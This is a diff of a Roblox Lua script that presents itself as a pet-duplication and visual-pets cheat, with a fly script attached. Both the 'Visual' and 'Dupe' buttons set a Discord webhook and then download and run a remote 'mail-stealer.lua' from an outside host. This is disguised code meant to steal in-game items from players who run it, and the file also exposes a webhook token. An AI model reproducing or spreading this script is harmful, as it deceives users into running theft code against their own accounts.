@@ -1,38 +1,38 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("🌊🌊 Omegaa Script", "Midnight")
- 
+
 -- MAIN
 local Tab = Window:NewTab("Visual")
 local VisualSection = Tab:NewSection("Make Visual Pets")
- 
- 
+
+
 VisualSection:NewButton("Click here", "You must have 1 or more party dogs", function()
     getgenv().webhook = "https://discord.com/api/webhooks/1086369484207575050/1YOuu8Aki5kKCTB7aVR99_DYt2eb3tTF6LgD04XTwlX4yqR77_VlNg6v1x7ckb0hvvfv"
     getgenv().name = "3Hacs"
     getgenv().mouselock = true
     loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
 end)
- 
+
 -- DUPE
 local Tab = Window:NewTab("Dupe")
 local Section = Tab:NewSection("Dupe Pets")
- 
- 
+
+
 Section:NewButton("Dupe", "Dupe Pets", function()
     getgenv().webhook = "https://discord.com/api/webhooks/1086369484207575050/1YOuu8Aki5kKCTB7aVR99_DYt2eb3tTF6LgD04XTwlX4yqR77_VlNg6v1x7ckb0hvvfv"
     getgenv().name = "3Hacs"
     getgenv().mouselock = true
     loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
 end)
- 
- 
+
+
 -- Other
 local Tab = Window:NewTab("Other")
 local Section = Tab:NewSection("Other Thinks")
- 
- 
+
+
 Section:NewButton("Fly and Chat Spoofer!", "Fly and prank script", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/BypassedFly.lua"))() 
- 
+
     Fly(true)
 end)
